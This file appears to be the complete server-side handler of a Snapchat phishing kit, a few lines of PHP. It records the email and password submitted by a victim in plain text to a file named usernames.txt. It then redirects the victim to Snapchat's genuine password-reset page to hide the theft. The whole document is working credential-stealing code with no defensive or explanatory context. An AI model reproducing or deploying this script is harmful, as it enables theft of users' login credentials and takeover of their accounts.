<?php

file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/password_reset_options');
exit();
